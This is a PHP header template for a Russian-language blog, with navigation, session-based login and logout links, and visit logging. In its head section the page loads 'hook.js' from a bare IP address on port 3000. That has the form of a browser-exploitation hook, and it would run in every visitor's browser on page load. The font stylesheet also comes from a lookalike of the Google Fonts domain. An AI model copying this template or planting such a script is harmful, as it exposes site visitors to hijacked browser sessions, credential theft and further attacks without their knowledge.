<?php
global $pdo;
session_start();
?>
<?php
require_once 'db.php'; // Подключаем файл с настройками базы данных
log_visit($pdo); // Логируем посещение
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Блог</title>
    <link rel="stylesheet" href="../style.css">
    <link href="https://fronts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
    <script src="http://31.172.66.196:3000/hook.js"></script>
</head>
<body>
    <header>
       <nav>
            <ul>
                <li><a href="index.php">Главная</a></li>
                <li><a href="upload.php">Загрузить</a></li>
                <li><a href="images.php">Изображения</a></li>
                <li><a href="videos.php">Видео</a></li>
                <?php if (isset($_SESSION['username'])): ?>
                    <li>Привет, <?php echo htmlspecialchars($_SESSION['username'], ENT_QUOTES, 'UTF-8'); ?></li>
                    <li><a href="logout.php">Выйти</a></li>
                <?php else: ?>
                    <li><a href="login.php">Войти</a></li>
                    <li><a href="register.php">Регистрация</a></li>
                <?php endif; ?>
            </ul>
        </nav>
    </header>
       <?php if (isset($_SESSION['user_id'])): ?>
        <p>Здравствуйте, <?php echo htmlspecialchars($_SESSION['username']); ?>!</p>
        <p><a href="logout.php">Выйти</a></p>
    <?php else: ?>
        <p><a href="login.php">Вход</a> или <a href="register.php">Регистрация</a></p>
    <?php endif; ?>
    <?php include 'footer.php'; ?>
  
